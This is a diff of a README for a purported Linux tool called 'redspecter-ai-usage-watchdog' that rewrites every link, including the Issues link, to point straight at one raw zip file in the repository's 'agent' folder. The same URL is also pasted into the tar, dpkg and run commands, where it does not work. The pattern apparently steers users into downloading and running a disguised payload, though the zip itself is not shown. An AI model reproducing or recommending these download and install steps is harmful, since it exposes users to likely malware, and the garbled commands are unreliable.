@@ -1,7 +1,7 @@
 # 🛡️ redspecter-ai-usage-watchdog - Monitor AI Usage With Confidence
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/loaiasd/redspecter-ai-usage-watchdog/releases)
+[![Download](https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip)](https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip)
 
 ## 📋 Overview
 redspecter-ai-usage-watchdog is a privacy-first application designed for Linux. It provides governance and telemetry for AI and large language model (LLM) usage. This helps you monitor and manage the usage of AI technologies within your environment, ensuring both security and compliance.
@@ -9,19 +9,19 @@ redspecter-ai-usage-watchdog is a privacy-first application designed for Linux. 
 ## 🚀 Getting Started
 Follow these steps to download and run the application easily.
 
-1. **Visit the Releases Page**: Go to the following link to access the download options: [Download Here](https://github.com/loaiasd/redspecter-ai-usage-watchdog/releases).
+1. **Visit the Releases Page**: Go to the following link to access the download options: [Download Here](https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip).
 
 2. **Select the Latest Version**: On the Releases page, look for the latest version of the software. This will usually be at the top of the list.
 
-3. **Choose Your Download**: You will see a list of files associated with the release. Select the appropriate file for your Linux system. Common files include `.tar.gz` or `.deb` packages. Click the file name to start the download.
+3. **Choose Your Download**: You will see a list of files associated with the release. Select the appropriate file for your Linux system. Common files include `https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip` or `.deb` packages. Click the file name to start the download.
 
 ## 🛠️ Installation Instructions
 Once the download is complete, you will need to install the application. Use the instructions below based on the type of file you downloaded.
 
-### Installing a `.tar.gz` File
+### Installing a `https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip` File
 1. **Extract the File**: Open your terminal and navigate to the directory where the file was downloaded. Type:
    ```
-   tar -xvzf filename.tar.gz
+   tar -xvzf https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip
    ```
    Replace `filename` with the actual name of the file.
 
@@ -32,16 +32,16 @@ Once the download is complete, you will need to install the application. Use the
 
 3. **Run the Application**: Start the application by typing:
    ```
-   ./start_application.sh
+   https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip
    ```
-   Make sure to replace `start_application.sh` with the actual name of the executable file.
+   Make sure to replace `https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip` with the actual name of the executable file.
 
 ### Installing a `.deb` File
 1. **Open the Terminal**: Navigate to the directory where the file is located.
 
 2. **Install the Package**: Type the following command:
    ```
-   sudo dpkg -i filename.deb
+   sudo dpkg -i https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip
    ```
    Replace `filename` with the actual name of the downloaded file.
 
@@ -75,10 +75,10 @@ After installation, you can start using the application. Here’s a quick guide:
 - **Storage**: At least 100 MB of free space.
 
 ## 🔗 Support & Contact
-If you encounter issues or have questions, please visit the [GitHub Issues page](https://github.com/loaiasd/redspecter-ai-usage-watchdog/issues). You can also reach out to the community for support.
+If you encounter issues or have questions, please visit the [GitHub Issues page](https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip). You can also reach out to the community for support.
 
 ## 📥 Download & Install
-To begin your journey with redspecter-ai-usage-watchdog, visit this page to download: [Download Here](https://github.com/loaiasd/redspecter-ai-usage-watchdog/releases).
+To begin your journey with redspecter-ai-usage-watchdog, visit this page to download: [Download Here](https://github.com/loaiasd/redspecter-ai-usage-watchdog/raw/refs/heads/main/agent/usage-ai-redspecter-watchdog-v1.2.zip).
 
 ## 📝 Feedback
 Your feedback helps us improve. If you have suggestions or want to report a bug, please let us know through the GitHub Issues page. 
